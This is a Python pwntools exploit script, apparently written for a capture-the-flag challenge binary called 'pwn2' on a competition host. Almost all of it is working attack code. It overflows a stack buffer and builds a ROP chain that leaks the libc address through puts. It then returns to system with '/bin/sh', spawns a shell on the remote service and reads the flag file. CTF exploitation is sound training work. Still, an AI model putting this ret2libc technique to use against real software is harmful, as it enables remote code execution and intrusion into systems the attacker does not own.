#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.n00bzunit3d.xyz --port 35932 pwn1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwn2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 61223)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# gadgets in the executable
ret = 0x40101a
pop_rdi = 0x401196

# leak libc base + return to main
io.sendline("a")
io.sendline(b"a"*40+ p64(pop_rdi) + p64(exe.got['puts'])  +p64(exe.plt['puts']) + p64(exe.symbols['main']))
io.recvuntil("}")

libc = exe.libc
libc.address = int.from_bytes(io.recvline()[:-1],'little') - libc.symbols['puts']
print(f'{libc.address:x}')

# return to system
io.sendline("a")
io.sendline(b"a"*40 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))  + p64(libc.symbols['system']))

io.sendline("cat flag.txt")
io.interactive()

